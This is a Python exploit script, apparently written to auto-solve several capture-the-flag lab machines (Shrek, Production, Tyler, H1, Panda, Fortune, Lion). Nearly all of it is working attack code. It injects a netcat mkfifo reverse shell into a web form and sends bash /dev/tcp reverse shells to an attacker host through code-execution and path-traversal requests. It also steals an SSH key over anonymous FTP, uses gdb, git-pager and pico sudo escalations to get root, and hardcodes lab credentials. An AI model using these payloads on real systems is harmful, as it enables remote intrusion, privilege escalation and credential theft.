from pwn import *
import requests
import os
import ftplib

# machineName = input("Enter Machine Name: ")
sess = requests.session()
usage = f"Usage: {sys.argv[0]} <Machine Name> <Machine Ip>"

# -------------------------------------------------- Shrek -------------------------------------------------- #
def Shrek():
    global ip
    os.system(f"wget {ip}/Cpxtpt2hWCee9VFa.txt 2>/dev/null; mv Cpxtpt2hWCee9VFa.txt key; chmod 600 key")
    req = ssh(host=ip, user='shrek', keyfile='key')
    shell = req.process("/bin/sh")
    shell.sendline(b"""gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit""")
    shell.sendline(b"")
    time.sleep(1)
    shell.interactive()

# -------------------------------------------------- Production -------------------------------------------------- #
def Production():
    global ip
    print("Please Add Machine Ip To Your '/etc/hosts'")
    input("[*] Press Enter To Continue")
    username = "anonymous"
    password = "anonymous"
    filenames = [
            "flag.txt",
            "id_rsa"
    ]
    ftp_server = ftplib.FTP('production.thm', username, password)
    ftp_server.encoding = 'utf-8'
    for filenames in filenames:
        with open(filenames, "wb") as f:
            ftp_server.retrbinary(f"RETR {filenames}", f.write)
        file = open("flag.txt", "r")
    ftp_server.quit()
    os.system("cat id_rsa > key")
    req = ssh(host='production.thm', user='ashu', keyfile='key')
    shell = req.process("/bin/sh")
    shell.sendline(b"sudo su skidy")
    shell.sendline(b"")
    time.sleep(1)
    shell.sendline(b"""sudo PAGER='sh -c "exec sh 0<&1"' git -p help""")
    time.sleep(1)
    shell.interactive()

# -------------------------------------------------- Tyler -------------------------------------------------- #
def Tyler():
    global sess, ip
    ip = input("Enter Machine Ip: ")
    LHOST = input("[*] Enter LHOST: ")
    LPORT = input("[*] Enter Listening Port: ")
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"

    postData = {
        "user" : f'1;{payload}',
        "submit" : 'Submit+Query'
    }
    print("[*] Sending Payload")
    try:
        shell = sess.post(f"http://{ip}/betatest/checkuser.php", data=postData)
        if(shell.status_code == 200):
            print("[*] Payload Sent")
            print("[*] vim /etc/sudoers and add 'tdurden ALL=(ALL)	ALL'")
            print("[*] Then do whatever you want")
        else:
            print("[!] Payload Failed")
            exit()
    except:
        print("[!] Connection Failed")
        exit()
    
# -------------------------------------------------- H1 - Easy -------------------------------------------------- #

def H1():
    global sess, ip
    userIp = input("Enter Your Ip: ")
    port = input("Enter Listening Port: ")
    payload = f"""exec("echo 'chmod 4777 /bin/bash' >> /home/serv3/backups/backup.sh;/bin/bash -c 'bash -i >& /dev/tcp/{userIp}/{port} 0>&1'");"""
    data = {
        "code" : payload
    }
    print("[*] Sending Payload")
    print("[*] Root Command: >$ '/bin/bash -p'")
    shell = sess.post(f"http://{ip}:8002/trycode", data=data)
    if(shell.status_code == 200):
        print("[*] Check Your Listener")
    else:
        print("[!] Server Error")
        exit()

# -------------------------------------------------- Panda -------------------------------------------------- #
def Panda():
    global ip
    req = ssh(host=ip, user="shifu", password="batman")
    shell = req.process("/bin/sh")
    time.sleep(1)
    shell.interactive()

def Fortune():
    global sess, ip
    req = ssh(host=ip, user="fortuna", password="NjFiZWIyMG")
    print("""PRIVESC: "Its needed to keyboard and i couldnt find a way to do it with the shell sry but its on todo.txt:/"
>sudo pico
>passwd: "NjFiZWIyMG"
>CTRL + R, CTRL + X
>reset; sh 1>&0 2>&0
""")
    shell = req.process("/bin/sh")
    time.sleep(1)
    shell.interactive()

def Lion():
    global ip, sess
    LHOST = input("[*] Enter LHOST: ")
    LPORT = input("[*] Enter Listening Port: ")
    command = f"""curl -s -X POST 'http://{ip}:8080/.%0d./.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"'"""
    os.system(command)
    print(command)

if __name__ == "__main__":
    if len(sys.argv) < 3 :
        print(usage)
    else:
        machineName = sys.argv[1]
        ip = sys.argv[2]
        if machineName.lower() == "tyler":
            Tyler()
        if machineName.lower() == "production":
            Production()
        if machineName.lower() == "shrek":
            Shrek()
        if machineName.lower() == "panda":
            Panda()
        if machineName.lower == "h1":
            H1()
        if machineName.lower() == "fortune":
            Fortune()
        if machineName == "lion":
            Lion()
        else:
            print("[!] Invalid Machine Name")
            exit()
